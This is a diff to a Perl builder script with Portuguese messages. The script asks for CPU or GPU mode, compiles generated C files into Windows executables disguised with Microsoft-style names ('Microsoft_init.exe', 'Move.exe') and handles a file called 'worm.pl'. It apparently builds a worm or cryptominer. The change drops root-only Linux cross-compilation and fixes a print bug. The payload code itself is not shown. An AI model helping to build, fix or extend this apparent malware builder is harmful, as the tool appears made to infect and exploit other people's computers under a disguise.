@@ -25,7 +25,7 @@ sub start {
 	my $cpu_or_gpu = <STDIN>;
 	if(defined($cpu_or_gpu)){
 	  chomp $cpu_or_gpu;
-	  my ($gcc, $command) = "gcc", undef;
+	  my $command = undef;
 	  $command = "CPU" if $cpu_or_gpu =~ /CPU/i;
 	  $command = "GPU" if $cpu_or_gpu =~ /GPU/i;
 	  my $code =
@@ -127,21 +127,14 @@ HERE
 	  print MOVE $init;
 	  close(MOVE);
 	  if($Config{osname} =~ /linux/i){
-	    if($< != 0){
-		  print "\n[", color("RED"),"*",color("reset") . "] Execute o programa como root !\n";
-		  exit 0;
-		}
-		print "\n[", color("RED"),"*",color("reset") . "] Em 3 segundos, o programa ira instalar dependencias necessarias\n";
-		sleep 3;
-		system("sudo apt-get install mingw-w64 -y");
-		$gcc = "i686-w64-mingw32-" . $gcc . " -m32";
+	    print "[", color("RED"),"*",color("reset"), "] O programa nao funciona no Linux !\n";
 	  }
 	  if(-e "init.c"){
-	    system("$gcc -o Microsoft_init.exe init.c");
+	    system("gcc -o Microsoft_init.exe init.c");
 		unlink "init.c";
 	  }
 	  if(-e "move.c"){
-	    system("$gcc -o Move.exe move.c");
+	    system("gcc -o Move.exe move.c");
 	    unlink "move.c";
 	  }
 	  if(-e "worm.pl"){
@@ -151,7 +144,7 @@ HERE
 	  if(-e "Microsoft.exe" && -e "Move.exe"){
 	    print "\n[" . color("RED"),"*",color("reset") . "] " . color("GREEN"),"Sucesso\n",color("reset");
 	  }else{
-	    print "\n[" . color("RED"),"*",color("reset") . "] " . print "Algo deu errado\n";
+	    print "\n[" . color("RED"),"*",color("reset") . "] Algo deu errado\n";
 	  }
 	  sleep 3;
 	}
